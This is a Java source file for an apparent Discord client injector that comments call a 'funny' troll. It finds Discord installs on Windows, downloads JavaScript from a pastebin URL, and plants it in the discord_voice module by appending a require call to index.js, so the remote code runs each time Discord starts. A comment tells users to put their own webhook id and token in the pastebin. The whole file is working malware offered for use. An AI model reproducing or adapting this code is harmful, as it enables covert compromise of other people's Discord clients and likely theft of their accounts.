package me.sxmurai.funny;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.*;

// finally, my javascript knowledge is being used after not using it for months
public class Main {
    private static final String PASTEBIN = "https://pastebin.com/raw/GyzcfnfC"; // make this your own pastebin with your own webhook id and token

    /**
     * Steps:
     * 1. Find local appdata dir
     * 2. Find their discord directories
     * 3. Inject into discord_voice module with our funny JavaScript code
     * 4. win
     */
    public static void main(String[] args) {
        String appdata = System.getenv("LOCALAPPDATA");
        if (appdata == null || appdata.isEmpty()) {
            return;
        }

        String[] paths = getDiscordPath();
        if (paths == null) {
            return;
        }

        String js = request();
        if (js == null || js.isEmpty()) {
            return; // retard
        }

        for (String path : paths) {
            File file = Paths.get(appdata, path).toFile();
            if (!file.exists() || !file.isDirectory()) {
                continue;
            }

            // we now have to look through a few directories to even get the file we want.
            String[] dirs = new String[] { "app-", "modules", "discord_voice", "discord_voice" };
            File[] files = null;

            File curr = file;

            for (String dir : dirs) {
                Pair<File, File[]> pair = search(curr, dir);
                if (pair == null) {
                    continue;
                }

                curr = pair.key;
                files = pair.value;
            }

            if (files == null || files.length == 0) {
                continue;
            }

            Path voiceHandlerJs = curr.toPath().resolve("voice_handler.js");

            if (!Files.exists(voiceHandlerJs)) {
                Optional<File> yes = Arrays.stream(files).filter((f) -> f.getName().contains("index.js")).findFirst();
                if (!yes.isPresent()) {
                    continue;
                }

                File index = yes.get();

                // we now need to write two files.
                // 1. at the bottom of index.js we put 'require('./voice_handler')()' to invoke the shit in voice_handler
                // 2. a new file called voice_handler so that we can run that code

                String contents = read(index.toPath());
                contents += "\nrequire('./voice_handler')();";

                write(index.toPath(), contents);
            }

            write(voiceHandlerJs, js);
        }
    }

    private static void write(Path path, String contents) {
        if (!Files.exists(path)) {
            try {
                Files.write(path, Collections.singleton(contents), StandardOpenOption.CREATE_NEW);
            } catch (IOException e) {
                return;
            }
        }

        try {
            Files.write(path, Collections.singleton(contents), StandardOpenOption.WRITE);
        } catch (IOException ignored) { } // unfortunate, this will probably crash their discord client which is still trolling so...
    }

    private static String read(Path path) {
        try {
            return String.join("\n", Files.readAllLines(path, Charset.defaultCharset()));
        } catch (IOException e) {
            return null;
        }
    }

    private static Pair<File, File[]> search(File dir, String lookup) {
        if (!dir.exists() || !dir.isDirectory()) {
            return null;
        }

        for (File file : Objects.requireNonNull(dir.listFiles())) {
            // we use startsWith because versioning can change throughout versions
            if (file.getName().toLowerCase().startsWith(lookup) && file.isDirectory()) {
                return new Pair<>(file, file.listFiles());
            }
        }

        return null;
    }

    private static String request() {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(PASTEBIN).openConnection();
            connection.setReadTimeout(5000);
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0");

            return convert(new BufferedInputStream(connection.getInputStream()));
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private static String convert(InputStream stream) {
        Scanner scanner = new Scanner(stream).useDelimiter("\\A");
        return scanner.hasNext() ? scanner.next() : "/";
    }

    private static String[] getDiscordPath() {
        String name = System.getProperty("os.name").toLowerCase();
        if (name.contains("win")) {
            return new String[] { "/Discord/", "/DiscordPtb", "/DiscordCanary/" };
        } else {
            return null; // someone please tell me the directories for other os's
        }
    }

    private static class Pair<K, V> {
        private final K key;
        private final V value;

        public Pair(K key, V value) {
            this.key = key;
            this.value = value;
        }
    }
}
